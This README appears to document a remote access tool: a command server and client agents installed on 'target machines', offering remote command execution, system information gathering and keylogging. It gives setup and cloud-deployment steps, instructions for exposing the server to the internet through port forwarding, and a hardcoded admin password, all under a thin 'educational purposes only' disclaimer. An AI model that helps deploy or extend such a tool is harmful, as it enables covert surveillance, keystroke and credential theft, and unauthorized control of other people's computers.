# Client Management System

This system consists of a server component and client agents that can be deployed on target machines.

## Server Setup

### Local Development

1. Install required packages:
   ```
   pip install -r requirements.txt
   ```

2. Start the server:
   ```
   cd server
   python server.py
   ```

3. Access the web interface:
   - Local: http://localhost:8080
   - Remote: http://your-server-ip:8080
   - HTTPS (if available): https://your-server-ip:8080

### Cloud Deployment (Render)

1. Push your code to GitHub
2. Deploy to Render using the provided `render.yaml` configuration
3. Access your app at: `https://yourapp.onrender.com`
4. See [RENDER_DEPLOYMENT.md](RENDER_DEPLOYMENT.md) for detailed deployment instructions

4. Login credentials:
   - Username: `admin`
   - Password: `pablosboson2024`

## Client Setup

1. Install required packages on the client machine:
   ```
   pip install -r requirements.txt
   ```

2. Configure the client connection:
   
   **For local server:**
   ```bash
   cd client
   python client.py
   ```
   
   **For cloud deployment (Render):**
   ```bash
   # Windows
   set SERVER_IP=yourapp.onrender.com
   cd client
   python client.py
   
   # Linux/Mac
   export SERVER_IP=yourapp.onrender.com
   cd client
   python client.py
   ```

## Making It Work Online

To make the system accessible from the internet:

1. Ensure your server has a public IP address or use port forwarding on your router
2. Forward ports 5000 (client connections) and 8080 (web interface) to your server
3. Update the `SERVER_IP` in client.py to your public IP address
4. Consider using a dynamic DNS service if your public IP changes frequently

## Security Notes

- The system uses HTTPS with self-signed certificates for the web interface
- All client-server communication is unencrypted by default
- Change the default admin password after first login
- This tool is for educational purposes only

## Features

- Real-time client monitoring
- Remote command execution
- System information gathering
- Keylogging capabilities
- Secure web interface with login authentication